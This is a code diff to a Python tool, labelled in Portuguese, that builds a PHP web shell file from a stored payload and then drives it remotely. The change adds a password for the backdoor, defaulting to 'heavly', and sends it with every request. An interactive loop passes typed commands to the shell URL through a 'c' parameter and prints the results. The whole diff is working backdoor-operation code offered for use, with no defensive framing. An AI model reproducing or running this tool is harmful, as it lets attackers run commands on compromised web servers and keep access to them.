@@ -10,6 +10,8 @@ parser.add_argument("-u", dest="shell_url", action="store",
                     help="Url de sua shell!")
 parser.add_argument("-g", dest="generate", action="store",
                     help="Cria seu payload")
+parser.add_argument(dest="passwd", action="store",
+                    help="Senha do seu backdoor")
 args = parser.parse_args()
 
 for i in range(50):
@@ -18,20 +20,28 @@ for i in range(50):
     sleep(0.1)
 
 if args.generate:
+    if args.passwd:
+        passwd = str(args.passwd)
+    else:
+        passwd = 'heavly'
+
     shell_name = str(args.generate)
     shell = shell_name+'.php'
     opfile = open(shell,'+w')
     config = ConfigParser()
     config.read_file(open('config.ini'))
 
-    opfile.write(config['DEFAULT']['code'])
+    opfile.write(config['DEFAULT']['code'].format(passw=passwd))
     opfile.close()
     print('Generated file '+shell)
 
+
 if args.shell_url:
-    pwd = get(args.shell_url + "?c=pwd").text.replace("\n", "")
+    pwd = get(args.shell_url + '?passwd=' +
+             args.passwd + '&c=pwd').text.replace("\n", "")
     pwd += "$ "
     while True:
         command = input(pwd)
-        result = get(args.shell_url + "?c=" + command).text
+        result = get(args.shell_url + '?passwd=' +
+                    args.passwd + '&c=' + command).text
         print(result)
